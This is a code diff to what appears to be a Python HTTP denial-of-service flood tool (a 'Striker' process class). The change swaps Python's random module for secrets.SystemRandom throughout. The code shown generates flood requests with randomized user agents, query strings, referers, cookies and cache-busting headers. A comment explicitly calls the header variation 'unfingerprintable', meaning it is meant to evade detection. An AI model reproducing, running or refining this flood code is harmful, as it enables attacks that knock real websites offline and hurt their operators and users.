@@ -41,8 +41,10 @@ BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 
 from multiprocessing import Process, Manager, Pool
 import urllib.parse, ssl
-import sys, getopt, random, time, os
+import sys, getopt, time
 import http.client
+import secrets
+
 HTTPCLIENT = http.client
 
 ####
@@ -77,24 +79,24 @@ USER_AGENT_PARTS = {
         },
         'mac': {
             'name': ['Macintosh'],
-            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
+            'ext': ['Intel Mac OS X %d_%d_%d' % (secrets.SystemRandom().randint(10, 11), secrets.SystemRandom().randint(0, 9), secrets.SystemRandom().randint(0, 5)) for i in range(1, 10)]
         },
     },
     'platform': {
         'webkit': {
-            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
+            'name': ['AppleWebKit/%d.%d' % (secrets.SystemRandom().randint(535, 537), secrets.SystemRandom().randint(1,36)) for i in range(1, 30)],
             'details': ['KHTML, like Gecko'],
-            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
+            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (secrets.SystemRandom().randint(6, 32), secrets.SystemRandom().randint(100, 2000), secrets.SystemRandom().randint(0, 100), secrets.SystemRandom().randint(535, 537), secrets.SystemRandom().randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (secrets.SystemRandom().randint(4, 6), secrets.SystemRandom().randint(0, 1), secrets.SystemRandom().randint(0, 9), secrets.SystemRandom().randint(535, 537), secrets.SystemRandom().randint(1, 36)) for i in range(1, 10)]
         },
         'iexplorer': {
             'browser_info': {
                 'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                 'ext_pre': ['compatible', 'Windows; U'],
-                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
+                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (secrets.SystemRandom().randint(1, 3), secrets.SystemRandom().randint(0, 5), secrets.SystemRandom().randint(1000, 30000)) for i in range(1, 10)]
             }
         },
         'gecko': {
-            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
+            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (secrets.SystemRandom().randint(2001, 2010), secrets.SystemRandom().randint(1,31), secrets.SystemRandom().randint(1,12) , secrets.SystemRandom().randint(10, 25)) for i in range(1, 30)],
             'details': [],
             'extensions': []
         }
@@ -292,7 +294,7 @@ class Striker(Process):
         validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
 
         for i in range(0, size):
-            a = random.choice(validChars)
+            a = secrets.SystemRandom().choice(validChars)
             out_str += chr(a)
 
         return out_str
@@ -323,7 +325,7 @@ class Striker(Process):
 
                     (url, headers) = self.createPayload()
 
-                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
+                    method = secrets.SystemRandom().choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
 
                     conn_req.request(method.upper(), url, None, headers)
 
@@ -357,7 +359,7 @@ class Striker(Process):
         req_url, headers = self.generateData()
 
         random_keys = list(headers.keys())
-        random.shuffle(random_keys)
+        secrets.SystemRandom().shuffle(random_keys)
         random_headers = {}
 
         for header_name in random_keys:
@@ -371,8 +373,8 @@ class Striker(Process):
 
         for i in range(ammount):
 
-            key = self.buildblock(random.randint(3,10))
-            value = self.buildblock(random.randint(3,20))
+            key = self.buildblock(secrets.SystemRandom().randint(3,10))
+            value = self.buildblock(secrets.SystemRandom().randint(3,20))
             element = "{0}={1}".format(key, value)
             queryString.append(element)
 
@@ -399,12 +401,12 @@ class Striker(Process):
 
     def generateRequestUrl(self, param_joiner = '?'):
 
-        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
+        return self.url + param_joiner + self.generateQueryString(secrets.SystemRandom().randint(1,5))
 
     def getUserAgent(self):
 
         if self.useragents:
-            return random.choice(self.useragents)
+            return secrets.SystemRandom().choice(self.useragents)
 
         # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
 
@@ -413,41 +415,41 @@ class Striker(Process):
 
         ## System And Browser Information
         # Choose random OS
-        os = USER_AGENT_PARTS['os'][random.choice(list(USER_AGENT_PARTS['os'].keys()))]
-        os_name = random.choice(os['name'])
+        os = USER_AGENT_PARTS['os'][secrets.SystemRandom().choice(list(USER_AGENT_PARTS['os'].keys()))]
+        os_name = secrets.SystemRandom().choice(os['name'])
         sysinfo = os_name
 
         # Choose random platform
-        platform = USER_AGENT_PARTS['platform'][random.choice(list(USER_AGENT_PARTS['platform'].keys()))]
+        platform = USER_AGENT_PARTS['platform'][secrets.SystemRandom().choice(list(USER_AGENT_PARTS['platform'].keys()))]
 
         # Get Browser Information if available
         if 'browser_info' in platform and platform['browser_info']:
             browser = platform['browser_info']
 
-            browser_string = random.choice(browser['name'])
+            browser_string = secrets.SystemRandom().choice(browser['name'])
 
             if 'ext_pre' in browser:
-                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)
+                browser_string = "%s; %s" % (secrets.SystemRandom().choice(browser['ext_pre']), browser_string)
 
             sysinfo = "%s; %s" % (browser_string, sysinfo)
 
             if 'ext_post' in browser:
-                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))
+                sysinfo = "%s; %s" % (sysinfo, secrets.SystemRandom().choice(browser['ext_post']))
 
 
         if 'ext' in os and os['ext']:
-            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
+            sysinfo = "%s; %s" % (sysinfo, secrets.SystemRandom().choice(os['ext']))
 
         ua_string = "%s (%s)" % (mozilla_version, sysinfo)
 
         if 'name' in platform and platform['name']:
-            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
+            ua_string = "%s %s" % (ua_string, secrets.SystemRandom().choice(platform['name']))
 
         if 'details' in platform and platform['details']:
-            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
+            ua_string = "%s (%s)" % (ua_string, secrets.SystemRandom().choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
 
         if 'extensions' in platform and platform['extensions']:
-            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))
+            ua_string = "%s %s" % (ua_string, secrets.SystemRandom().choice(platform['extensions']))
 
         return ua_string
 
@@ -455,14 +457,14 @@ class Striker(Process):
 
         # Random no-cache entries
         noCacheDirectives = ['no-cache', 'max-age=0']
-        random.shuffle(noCacheDirectives)
-        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
+        secrets.SystemRandom().shuffle(noCacheDirectives)
+        nrNoCache = secrets.SystemRandom().randint(1, (len(noCacheDirectives)-1))
         noCache = ', '.join(noCacheDirectives[:nrNoCache])
 
         # Random accept encoding
         acceptEncoding = ['\'\'','*','identity','gzip','deflate']
-        random.shuffle(acceptEncoding)
-        nrEncodings = random.randint(1,int(len(acceptEncoding)/2))
+        secrets.SystemRandom().shuffle(acceptEncoding)
+        nrEncodings = secrets.SystemRandom().randint(1,int(len(acceptEncoding)/2))
         roundEncodings = acceptEncoding[:nrEncodings]
 
         http_headers = {
@@ -470,7 +472,7 @@ class Striker(Process):
             'Cache-Control': noCache,
             'Accept-Encoding': ', '.join(roundEncodings),
             'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(1,1000),
+            'Keep-Alive': secrets.SystemRandom().randint(1,1000),
             'Host': self.host,
         }
 
@@ -478,30 +480,30 @@ class Striker(Process):
         # These headers are optional and are
         # randomly sent thus making the
         # header count random and unfingerprintable
-        if random.randrange(2) == 0:
+        if secrets.SystemRandom().randrange(2) == 0:
             # Random accept-charset
             acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
-            random.shuffle(acceptCharset)
-            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))
+            secrets.SystemRandom().shuffle(acceptCharset)
+            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(secrets.SystemRandom().random(), 1), round(secrets.SystemRandom().random(), 1))
 
-        if random.randrange(2) == 0:
+        if secrets.SystemRandom().randrange(2) == 0:
             # Random Referer
-            url_part = self.buildblock(random.randint(5,10))
+            url_part = self.buildblock(secrets.SystemRandom().randint(5,10))
 
-            random_referer = random.choice(self.referers) + url_part
+            random_referer = secrets.SystemRandom().choice(self.referers) + url_part
 
-            if random.randrange(2) == 0:
-                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
+            if secrets.SystemRandom().randrange(2) == 0:
+                random_referer = random_referer + '?' + self.generateQueryString(secrets.SystemRandom().randint(1, 10))
 
             http_headers['Referer'] = random_referer
 
-        if random.randrange(2) == 0:
+        if secrets.SystemRandom().randrange(2) == 0:
             # Random Content-Trype
-            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])
+            http_headers['Content-Type'] = secrets.SystemRandom().choice(['multipart/form-data', 'application/x-url-encoded'])
 
-        if random.randrange(2) == 0:
+        if secrets.SystemRandom().randrange(2) == 0:
             # Random Cookie
-            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
+            http_headers['Cookie'] = self.generateQueryString(secrets.SystemRandom().randint(1, 5))
 
         return http_headers
 
